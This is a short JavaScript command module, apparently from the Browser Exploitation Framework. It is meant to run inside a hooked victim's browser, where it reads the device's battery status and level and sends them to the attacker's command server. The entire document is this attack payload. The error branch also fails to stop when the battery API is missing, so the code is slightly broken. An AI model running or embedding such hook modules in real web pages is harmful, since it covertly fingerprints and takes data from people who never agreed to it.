//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//
server.execute(function() {
    var battery = navigator.battery || navigator.webkitBattery || navigator.mozBattery;

    if (!battery) {
       server.net.send("<%= @command_url %>", <%= @command_id %>, "Unable to get battery status");
    }

    var chargingStatus = battery.charging;
    var batteryLevel = battery.level * 100 + "%";
    var chargingTime = battery.chargingTime;
    var dischargingTime = battery.dischargingTime;

    server.net.send("<%= @command_url %>", <%= @command_id %>, "chargingStatus=" + chargingStatus + "&batteryLevel=" + batteryLevel + "&chargingTime=" + chargingTime + "&dischargingTime=" + dischargingTime);
});
